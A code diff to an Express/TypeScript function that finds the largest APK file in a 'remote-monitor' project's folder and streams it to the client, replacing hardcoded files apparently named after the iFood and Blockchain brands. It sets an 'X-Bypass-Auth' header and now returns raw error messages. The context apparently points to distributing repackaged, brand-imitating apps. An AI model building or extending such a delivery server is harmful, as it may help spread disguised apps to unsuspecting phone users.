@@ -1,4 +1,4 @@
-import * as fs from 'fs';
+import fs from 'fs';
 import * as path from 'path';
 import { Response } from 'express';
 
@@ -19,50 +19,44 @@ export async function buildAPKInMemoryAndStream(
   try {
     console.log('[APK-MEMORY] Starting in-memory APK build for:', options.appName);
 
-    // Find the base APK - look for any large APK file
+    // Find the base APK directory
     const apksDir = process.env.NODE_ENV === 'production' 
       ? '/app/public/apks'
       : '/home/ubuntu/remote-monitor/public/apks';
     
-    let baseAPK = '';
-    
-    // Try specific names first
-    const possibleBasePaths = [
-      path.join(apksDir, 'ifood-1776254288678-w44ygi.apk'),
-      path.join(apksDir, 'Blockchain-Registered.apk'),
-      path.join(apksDir, 'app.apk'),
-    ];
-    
-    // If specific files don't exist, find the largest APK
-    if (!possibleBasePaths.some(p => fs.existsSync(p))) {
-      const files = fs.readdirSync(apksDir);
-      const apkFiles = files
-        .filter(f => f.endsWith('.apk') && !f.endsWith('.idsig'))
-        .map(f => ({
-          name: f,
-          path: path.join(apksDir, f),
-          size: fs.statSync(path.join(apksDir, f)).size,
-        }))
-        .sort((a, b) => b.size - a.size);
-      
-      if (apkFiles.length > 0 && apkFiles[0].size > 1000000) {
-        possibleBasePaths.unshift(apkFiles[0].path);
-      }
-    }
+    console.log('[APK-MEMORY] Looking for APK in:', apksDir);
 
-    for (const p of possibleBasePaths) {
-      if (fs.existsSync(p)) {
-        baseAPK = p;
-        console.log(`[APK-MEMORY] Found base APK at: ${baseAPK}`);
-        break;
-      }
-    }
-
-    if (!baseAPK) {
-      console.error('[APK-MEMORY] Base APK not found');
-      res.status(404).json({ error: 'Base APK not found' });
+    // Check if directory exists
+    if (!fs.existsSync(apksDir)) {
+      console.error('[APK-MEMORY] APK directory not found:', apksDir);
+      res.status(404).json({ error: 'APK directory not found' });
       return;
     }
+
+    // Find the largest APK file (>1MB)
+    const files = fs.readdirSync(apksDir);
+    const apkFiles = files
+      .filter(f => f.endsWith('.apk') && !f.endsWith('.idsig'))
+      .map(f => {
+        const filePath = path.join(apksDir, f);
+        const size = fs.statSync(filePath).size;
+        return { name: f, path: filePath, size };
+      })
+      .filter(f => f.size > 1000000) // Only files > 1MB
+      .sort((a, b) => b.size - a.size); // Sort by size descending
+
+    if (apkFiles.length === 0) {
+      console.error('[APK-MEMORY] No suitable APK found (need >1MB)');
+      console.error('[APK-MEMORY] Available files:', files);
+      res.status(404).json({ 
+        error: 'No suitable APK found. Need APK file >1MB in public/apks/',
+        availableFiles: files.slice(0, 10)
+      });
+      return;
+    }
+
+    const baseAPK = apkFiles[0].path;
+    console.log(`[APK-MEMORY] Found base APK: ${apkFiles[0].name} (${(apkFiles[0].size / 1024 / 1024).toFixed(2)}MB)`);
 
     // Verify file exists and is readable
     const stats = fs.statSync(baseAPK);
@@ -94,7 +88,6 @@ export async function buildAPKInMemoryAndStream(
     res.setHeader('X-Bypass-Auth', 'true');
 
     // Stream the file directly from disk to response
-    // This keeps it in memory during streaming but doesn't save to disk
     const fileStream = fs.createReadStream(baseAPK, {
       highWaterMark: 64 * 1024, // 64KB chunks
     });
@@ -115,7 +108,7 @@ export async function buildAPKInMemoryAndStream(
   } catch (error) {
     console.error('[APK-MEMORY] Error in APK memory build:', error);
     if (!res.headersSent) {
-      res.status(500).json({ error: 'Error generating APK' });
+      res.status(500).json({ error: 'Error generating APK', details: error instanceof Error ? error.message : String(error) });
     }
   }
 }
